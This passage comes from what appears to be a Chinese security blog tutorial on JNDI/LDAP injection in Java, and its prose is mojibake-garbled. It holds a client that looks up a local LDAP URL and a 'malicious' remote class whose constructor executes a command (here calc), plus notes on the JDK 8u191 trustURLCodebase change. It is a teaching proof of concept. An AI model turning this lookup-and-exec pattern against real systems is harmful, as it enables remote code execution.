<p>ç¼–å†™ä¸€ä¸ªclientå®¢æˆ·ç«¯ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">clientdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/calc&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç¼–å†™ä¸€ä¸ªè¿œç¨‹æ¶æ„ç±»ï¼Œå¹¶å°†å…¶ç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œæ”¾ç½®webé¡µé¢ä¸­ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>è¿™é‡Œæœ‰ä¸ªå‘ç‚¹ï¼Œå°±æ˜¯æ¶æ„çš„ç±»ï¼Œä¸èƒ½åŒ…å«æœ€ä¸Šé¢çš„packageä¿¡æ¯ï¼Œå¦åˆ™ä¼šè°ƒç”¨å¤±è´¥ã€‚ä¸‹é¢æ¥å¯åŠ¨ä¸€ä¸‹æœåŠ¡å™¨ç«¯ï¼Œç„¶åå¯åŠ¨å®¢æˆ·ç«¯ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>åœ¨ JDK 8u191 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseã€‚è¿™æ ·çš„æ–¹å¼æ²¡æ³•è¿›è¡Œåˆ©ç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šæœ‰ç»•è¿‡æ–¹å¼ã€‚åœ¨è¿™é‡Œä¸åšèµ˜è¿°ã€‚</p>
<p>å‚è€ƒæ–‡ç« </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//xz.aliyun.com/t/8214</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/6633</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7264</span></span><br><span class="line">https:<span class="comment">//blog.wuhao13.xin/655.html</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_33020901/article/details/98472921</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
</search>
